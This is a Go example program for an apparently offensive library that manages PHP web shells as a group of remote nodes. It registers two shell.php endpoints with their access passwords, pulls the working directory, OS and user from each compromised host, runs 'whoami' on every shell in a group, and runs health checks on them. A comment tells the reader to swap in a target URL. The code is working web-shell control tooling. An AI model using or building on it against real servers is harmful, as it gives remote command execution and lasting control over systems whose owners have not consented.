package main

import (
	"context"
	"fmt"

	phpshell "github.com/Yliken/redbeanshellcore/adapter/php"
	"github.com/Yliken/redbeanshellcore/core"
	"github.com/Yliken/redbeanshellcore/registry/memory"
)

func main() {
	ctx := context.Background()

	reg := memory.New()
	mgr := core.NewManager(reg, phpshell.NewClientFactory())

	// 注册节点 a
	mgr.Register(ctx, core.NodeConfig{
		ID:        "lab-a",
		Endpoint:  "https://lab.example/shell.php // 替换为你的目标 URL",
		Adapter:   "php",
		Transport: "httpform",
		Auth:      map[string]string{"param": "antpwd"},
		Options:   map[string]string{"auth_password_field": "a"},
		Tags:      []string{"lab"},
		Group:     "case-001",
	})

	// 注册节点 b
	mgr.Register(ctx, core.NodeConfig{
		ID:        "lab-b",
		Endpoint:  "https://lab.example/shell.php // 替换为你的目标 URL",
		Adapter:   "php",
		Transport: "httpform",
		Auth:      map[string]string{"param": "chant"},
		Options:   map[string]string{"auth_password_field": "a"},
		Tags:      []string{"lab"},
		Group:     "case-001",
	})

	// 按 ID 取出并打印
	cliA, err := mgr.Client(ctx, "lab-a")
	if err != nil {
		fmt.Printf("[lab-a] client err: %v\n", err)
		return
	}
	resA, err := cliA.Do(ctx, phpshell.NewPhpInfo())
	if err != nil {
		fmt.Printf("[lab-a] info err: %v\n", err)
	} else {
		info := resA.(*core.InfoResult)
		fmt.Printf("[lab-a] workdir=%q os=%q user=%q\n", info.Workdir, info.OS, info.User) //1
	}

	// 按分组批量操作
	nodes, _ := mgr.List(ctx, core.NodeFilter{Group: "case-001"})
	for _, n := range nodes {
		cli, err := mgr.Client(ctx, n.Config.ID)
		if err != nil {
			fmt.Printf("[%s] client err: %v\n", n.Config.ID, err)
			continue
		}
		res, err := cli.Do(ctx, phpshell.NewPhpExec("whoami"))
		if err != nil {
			fmt.Printf("[%s] info err: %v\n", n.Config.ID, err)
			continue
		}
		info := res.(*core.ExecResult)
		fmt.Printf("[%s] Stdout=%s Stderr=%s ExitCode=%d\n", n.Config.ID, info.Stdout, info.Stderr, info.ExitCode)
	}

	// Ping + Refresh 健康检查
	if err := mgr.Ping(ctx, "lab-a", phpshell.NewPhpInfo()); err != nil {
		fmt.Printf("[lab-a] ping err: %v\n", err)
	}
	if _, err := mgr.Refresh(ctx, "lab-a", phpshell.NewPhpInfo()); err != nil {
		fmt.Printf("[lab-a] refresh err: %v\n", err)
	}
}
